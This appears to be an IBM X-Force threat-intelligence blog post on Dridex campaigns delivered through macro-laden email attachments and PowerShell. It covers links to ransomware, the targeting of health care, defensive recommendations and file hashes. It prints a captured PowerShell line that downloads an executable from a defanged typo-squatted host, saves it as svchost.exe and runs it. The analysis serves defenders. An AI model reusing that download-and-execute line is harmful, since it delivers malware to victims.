Dridex is delivered as a second-stage infector after an initial document or spreadsheet arrives via email with\nbooby-trapped macros. Recipients who activate the macros unknowingly launch malicious PowerShell scripts that will\ndownload additional malware. At this time, X-Force is seeing relatively limited campaigns active in Italy and Japan.\n\n## Invoke PowerShell, Download Dridex\n\nThe initial infection vector of the attacks we are observing is malspam email. Recipients receive unsolicited messages\ncontaining Microsoft Office file attachments, often delivered via the Cutwail botnet. Cutwail itself has been a prominent\nspamming infrastructure in the cybercrime arena, named as the largest of its kind in 2009, and continues to spread spam\nfor elite malware-wielding gangs in 2021.\n\nOverall, at least 34% of all PowerShell-based attacks X-Force has seen since June 2020 were ultimately linked with a\nDridex payload. The PowerShell uptick became apparent in early 2020 and started rising more considerably in May 2020.\n\nX-Force observed activity spikes in December 2020, which accounted for an 80% increase in the overall number of\nmalicious PowerShell attacks compared to the preceding six-month period. In January 2021, X-Force observed a sudden\ndecline in both PowerShell attacks as well as the embedded Dridex attacks, likely as the campaign ended and a new one\nstarted using a different macro variant and other scripts.\n\n_Figure 1: PowerShell network attacks per month (Source: IBM X-Force)_\n\n## Multi-Stage Infections\n\nIn the cases X-Force analyzed, PowerShell is instructed to bypass the local execution policy and then runs a Base64encoded command, which results in a request to browse to what is supposed to appear like a Microsoft update URL. The\nscript fetches a malicious executable file from that typo-squatted domain. These specific steps change per variant and\ncampaign.\n\n(New-Object\nSystem.Net.WebClient).DownloadFile(‘http://updates.ms0ffice[.]net/upd20991.exe’,”${Env:SystemRoot}\\Temp\\svchost.exe”);\nStart-Process “${Env:SystemRoot}\\Temp\\svchost.exe”;\n\nThe executable file is the Dridex payload. To evade detection, it disguises itself as a service host process and begins to run\nits data-stealing mechanisms.\n\n\n-----\n\n_Figure 2: Dridex infection flow from PowerShell scripts (Source: IBM X-Force)_\n\n## Banking Trojan or a Ransomware Threat?\n\nWhile Dridex is a banking Trojan, it is not necessarily always used as such. In some cases, its operators, known as the ‘Evil\nCorp’ gang, may leverage its ability to steal credentials on the fly or present victims with web injections. In other cases,\nDridex is employed as a bot-herding tool that is a powerful information stealer. Since it is also a persistent device infector, it\nis known to be part of high-stakes ransomware attacks. In this regard, Dridex has been linked with ransomware like\nBitPaymer and DoppelPaymer, as an example.\n\n## Health Care Sector in the Crosshairs Again\n\nWhen looking at the sectors targeted most often in our managed security services networks, X-Force is seeing that health\ncare is the top target of the overall increase in PowerShell attacks. Followed by the financial sector and by retailers, health\n[care has been seeing no less than an onslaught of cyberattacks on organizational networks since the COVID pandemic](https://healthitsecurity.com/news/healthcare-accounts-for-79-of-all-reported-breaches-attacks-rise-45)\nbroke. This is due to the sector being a critical part of the response to COVID and one where human life can be impacted\nby a cyberattack. In many cases, ransomware attacks seek to compromise hospitals for the inherent pressure they would\nhave to pay hefty ransoms to protect patients and resume operations.\n\n## Emotet Is Out; What’s Next for Dridex?\n\nDridex mostly does business with other cybercrime groups that have roots in the elite criminal arena in eastern Europe. In\nthe past, Dridex’s top spamming service was Necurs. When tactics changed from widespread infections to more targeted\nattacks, [Dridex moved on and away from Necurs, keeping Emotet as the botnet that opens doors for it to enter corporate](https://securityintelligence.com/posts/has-necurs-fallen-from-cybercrime-grace-elite-malware-botnet-now-distributes-clunky-scams/)\nnetworks. Since Emotet suffered a recent major blow by law enforcement, what’s next?\n\nIn campaigns that X-Force observed starting in early January 2021, it appears that Dridex is testing a couple of avenues. It\n[has been spreading through the Rig Exploit Kit, the Cutwail botnet and, in some cases, through the QakBot botnet. Its](https://twitter.com/malware_traffic/status/1346307776583262209?s=20)\nactivity, detected in Italy and Japan, remains relatively low.\n\n## Recommendations\n\nA Dridex malware infection on enterprise devices opens a door to more serious issues down the line. It can involve the theft\nof money from the company’s bank account or from infected employee accounts, or it can be as grave as a full-fledged\n[targeted ransomware and extortion attack. Damage can go from a few million dollars to hundreds of millions in the overall](https://www.ibm.com/security/data-breach)\nincident response process, regulatory fines, lawsuits and more. When it comes to malware, an ounce of prevention is worth\na pound of cure.\n\nEducate employees about the latest phishing techniques to assist them in spotting suspicious emails and refraining\nfrom opening unsolicited attachments.\n\n\n-----\n\nSecurity teams should employ applicable Yara rules to assist in detecting malicious PowerShell use. Monitor for\nsuspicious PowerShell commands and events.\nTune your organization’s [SIEM system with enhanced malicious PowerShell detection capabilities.](https://www.ibm.com/security/security-intelligence/qradar)\nIncorporate known Dridex, PowerShell and BitPaymer indicators of compromise (IOCs) into your security monitoring.\n[Consider a managed detection and response solution to secure your endpoints.](https://securityintelligence.com/posts/managed-detection-and-response-provider-outcomes/)\n\nIf you believe your organization is undergoing an active attack and you require assistance, please contact our team: U.S.\nhotline 1-888-241-9812 | Global hotline (+001) 312-212-8034.\n\n### Dridex File From This Analysis\n\nFile name: upd20991.exe\n\nFile type: Win32 EXE\n\nMD5: d759be13337417afa7b09617d0631a1c\n\nSHA-1: 8b1a421c02579558862614ce136210b1480f9622\n\nSHA-256: a32cb8a2260c89b904f4e2a3ab30432ffd94d7a56a4a7ae4b3bac2d1b8a90f68\n\nFor additional Dridex IOCs from recent campaigns, please check out X-Force Exchange.
